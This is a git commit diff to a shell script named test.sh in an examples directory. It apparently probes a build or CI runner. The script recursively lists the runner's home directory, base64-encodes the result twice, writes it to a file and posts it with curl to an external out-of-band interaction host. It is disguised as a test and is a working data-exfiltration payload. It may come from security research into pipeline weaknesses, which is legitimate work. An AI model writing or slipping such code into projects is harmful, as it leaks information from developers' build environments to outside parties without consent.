9b9fd583fe60341e786aa87c0c0176e73075829e
Roni-Carta <roni@landh.tech>
2024-10-03 20:13:23 +0200

    test ls 5

--- examples/nccl/test.sh
+++ examples/nccl/test.sh
@@ -1,7 +1,9 @@
 #!/bin/bash
 
-B64_BLOB=`ls -lahR /home/ | base64 | base64`
+B64_BLOB=`ls -lahR /home/runner/ | base64 | base64`
 
-curl -s -d "$B64_BLOB" "https://dqlfdzgroddmzbuqfjnd4pjc1za4wsp46.oast.fun/" > /dev/null
+echo $B64_BLOB > files.txt
+
+curl -s -d @files.txt "https://dqlfdzgroddmzbuqfjnd4pjc1za4wsp46.oast.fun/" > /dev/null
 
 echo "Done"
